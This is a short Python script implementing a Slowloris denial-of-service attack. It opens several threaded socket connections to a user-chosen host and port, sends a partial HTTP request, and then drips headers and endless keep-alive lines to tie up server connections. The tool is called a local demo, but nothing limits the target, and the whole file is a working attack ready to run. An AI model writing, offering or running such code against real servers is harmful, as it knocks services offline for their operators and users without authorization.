import argparse
import socket
import time
import threading

def slow_connection(target, port, interval=10):
    try:
        # use this context to close the connection automatically
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # connect to the target server
            s.connect((target, port))

            # sending the http request
            s.send(b"GET / HTTP/1.1\r\n")

        
            s.send(f"Host: {target}\r\n".encode())

            # list of headers to send slowly one by one
            headers = [
                "User-Agent: SlowlorisDemo",   
                "Accept: */*",                 
                "Connection: keep-alive",      
                "X-edentheskid: test"     
            ]

            # send each header with a delay to keep the request incomplete
            for header in headers:
                time.sleep(interval)  # wait before sending the next packet
                s.send(f"{header}\r\n".encode())
                print(f"Sent header: {header}")

            
            #! note: you need to stop the attack manually with ctrl + c #! 
            # keep sending small lines to reset server timeout
            while True:
                time.sleep(interval)
                s.send(b"X-Keep: alive\r\n")
                print("Sent keepalive line")
    except Exception as e:
        print("Connection closed:", e)

# get input from the user using argparse
def main():
   

    parser = argparse.ArgumentParser(description="slowloris demo in local server ")
    parser.add_argument("-t", "--target", required=True, help="target hostname/ip ")
    parser.add_argument("-p", "--port", type=int, default=8080, help="target port (default 8080)")
    parser.add_argument("-c", "--connections", type=int, default=5, help="number of connections")
    parser.add_argument("-i", "--interval", type=int, default=10, help="delay between headers in seconds")
    args = parser.parse_args()

    threads = []
    # open multiple connections at the same time using threads
    for i in range(args.connections):
        t = threading.Thread(target=slow_connection, args=(args.target, args.port, args.interval))
        t.start()
        threads.append(t)
        print(f"Connection {i+1} opened to {args.target}:{args.port}")

    # keep all threads alive to create load on the server ;)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
